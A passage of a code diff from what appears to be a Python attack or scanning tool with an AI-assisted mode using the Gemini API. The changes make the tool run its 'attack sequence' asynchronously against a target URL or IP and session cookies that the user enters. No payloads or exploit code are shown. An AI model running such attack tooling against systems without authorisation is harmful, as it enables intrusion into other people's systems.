+                print("  [INFO] Loaded API Key from config.ini.")
+            except Exception as e:
+                print(f"  [ERROR] Failed to configure Gemini API: {e}")
+                sys.exit(1)
         
         target = input("  [?] Enter target URL/IP for AI-Assisted Scan: ")
         cookies_raw = input("  [?] Enter session cookies if any (e.g., 'key1=val1; key2=val2'): ")
         if cookies_raw:
             session_cookies = {c.split('=')[0].strip(): c.split('=')[1].strip() for c in cookies_raw.split(';') if '=' in c}
         
-        run_attack_sequence(target, session_cookies, output_handler, ai_enabled=ai_enabled)
+        # Run the async attack sequence
+        asyncio.run(run_attack_sequence(target, session_cookies, output_handler, ai_enabled=ai_enabled))
 
     elif mode == '1':
         target = input("  [?] Enter target URL/IP: ")
@@ -6025,7 +6248,8 @@ if __name__ == '__main__':
         if cookies_raw:
             session_cookies = {c.split('=')[0].strip(): c.split('=')[1].strip() for c in cookies_raw.split(';') if '=' in c}
         
-        run_attack_sequence(target, session_cookies, output_handler, ai_enabled=ai_enabled)
+        # Run the async attack sequence
+        asyncio.run(run_attack_sequence(target, session_cookies, output_handler, ai_enabled=ai_enabled))
 
     elif mode == '2':
         print("\n[+] Web UI Mode Activated")
